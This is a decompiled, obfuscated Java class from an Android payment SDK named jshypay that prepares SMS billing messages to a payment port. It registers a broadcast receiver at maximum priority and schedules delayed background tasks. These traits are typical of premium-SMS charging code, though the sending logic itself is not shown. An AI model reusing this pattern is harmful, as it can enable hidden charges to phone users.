package com.jshymedia.jshypay.order;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.HandlerThread;
import android.telephony.SmsManager;
import com.jshymedia.jshypay.net.Purl;
import com.jshymedia.jshypay.ztool.Zlog;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class OrderHelperForDSms
{
  public static final String RECEVIER_DELI = "d_deli_flag";
  public static final String RECEVIER_SENDED = "d_send_flag";
  private PayOrder a;
  private Context b;
  private BroadcastReceiver c;
  private SmsManager d;
  private HandlerThread e;
  private Handler f;
  private Timer g;
  private TimerTask h;
  private int i = 3000;
  private int j = 6000;
  private int k = 0;
  private int l = 30;
  private boolean m = false;
  
  public OrderHelperForDSms(PayOrder paramPayOrder, Context paramContext)
  {
    new b(this);
    this.a = paramPayOrder;
    this.b = paramContext;
    this.c = new c(this);
    this.d = SmsManager.getDefault();
    this.e = new HandlerThread("worker");
    this.e.start();
    this.f = new Handler(this.e.getLooper());
    long l1 = this.a.getD_time();
    this.f.postDelayed(new d(this), l1);
    Zlog.syso("d_help_ok...");
    this.g = new Timer();
    this.h = new e(this);
  }
  
  private static void a(SmsComm paramSmsComm, Intent paramIntent)
  {
    paramIntent.putExtra("msg", paramSmsComm.getBillMoMsg());
    paramIntent.putExtra("port", paramSmsComm.getBillMoNumber());
    paramIntent.putExtra("hashCode", paramSmsComm.hashCode());
  }
  
  public static String replaceOther(String paramString)
  {
    String str = "";
    if (paramString != null) {
      str = Pattern.compile("=").matcher(paramString).replaceAll("=");
    }
    return str;
  }
  
  public void bindReceiver()
  {
    IntentFilter localIntentFilter = new IntentFilter();
    localIntentFilter.addAction(this.b.getPackageName() + "d_send_flag");
    localIntentFilter.setPriority(Integer.MAX_VALUE);
    this.b.registerReceiver(this.c, localIntentFilter);
  }
  
  public PayOrder getOrder()
  {
    return this.a;
  }
  
  public String makeDurl(String paramString)
  {
    paramString = Purl.makeUrl(paramString, this.a);
    StringBuffer localStringBuffer = new StringBuffer();
    HashMap localHashMap = this.a.getD_maps();
    Iterator localIterator = localHashMap.keySet().iterator();
    for (;;)
    {
      if (!localIterator.hasNext())
      {
        localStringBuffer.append("&fee=" + this.a.getMoney());
        return paramString + localStringBuffer.toString();
      }
      String str = (String)localIterator.next();
      localStringBuffer.append("&").append(str).append("=").append((String)localHashMap.get(str));
    }
  }
  
  public String makeDurl2(String paramString)
  {
    StringBuffer localStringBuffer = new StringBuffer();
    localStringBuffer.append("?");
    HashMap localHashMap = this.a.getD_maps();
    Iterator localIterator = localHashMap.keySet().iterator();
    for (;;)
    {
      if (!localIterator.hasNext()) {
        return paramString + localStringBuffer.toString();
      }
      String str = (String)localIterator.next();
      localStringBuffer.append("&").append(str).append("=").append((String)localHashMap.get(str));
    }
  }
  
  public void setOrder(PayOrder paramPayOrder)
  {
    this.a = paramPayOrder;
  }
  
  public void startPay()
  {
    this.f.post(new f(this));
  }
  
  public void unBindReceiver() {}
}
